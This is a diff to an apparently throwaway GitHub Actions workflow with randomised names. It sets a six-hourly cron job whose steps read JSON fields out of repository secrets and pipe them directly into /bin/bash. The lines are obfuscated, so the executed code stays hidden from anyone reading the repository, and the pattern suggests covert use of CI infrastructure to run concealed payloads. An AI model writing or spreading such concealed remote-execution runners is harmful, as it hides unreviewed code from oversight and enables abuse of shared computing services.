@@ -1,10 +1,11 @@
 name: pengchaofeng6715
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 0/6 * * *'
+    - cron: '26 1/6 * * *'
 
-jobs:  # 381
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +13,19 @@ jobs:  # 381
       - uses: actions/checkout@v4
       - name: pengchaofeng6715
         env:
-          lobx77: ${{ secrets.lobx77 }}
+          tan3575: ${{ secrets.tan3575 }}
         run: |
-          echo $lobx77 | jq -r .wp0335 | /bin/bash
-          echo $mnxzi3362 | jq -r .mxrz71 | /bin/bash
-          echo $sylw032 | jq -r .db72 | /bin/bash
-          echo $ity05 | jq -r .azgbu54599 | /bin/bash
-          echo $w3 | jq -r .hjkv25 | /bin/bash
-          echo $i707 | jq -r .i122 | /bin/bash
-          echo $iscey363 | jq -r .ujjph8 | /bin/bash
+          echo $tan3575 | jq -r .hmq466 | /bin/bash
+          echo $tg867 | jq -r .ivuqt91 | /bin/bash
+          echo $etj6 | jq -r .dauv9716 | /bin/bash
+          echo $oqd44 | jq -r .pr643 | /bin/bash
+          echo $xn9700 | jq -r .egt46 | /bin/bash
+          echo $zf01415 | jq -r .n2102 | /bin/bash
+          echo $fr2828 | jq -r .qa2383 | /bin/bash
+          echo $g189 | jq -r .kvd09757 | /bin/bash
+          echo $ealgp74 | jq -r .hxn75 | /bin/bash
+          echo $mmvdd507 | jq -r .g3 | /bin/bash
+          echo $z03 | jq -r .x907 | /bin/bash
+          echo $yr19 | jq -r .slmi6078 | /bin/bash
+          echo $w131 | jq -r .w65489 | /bin/bash
 
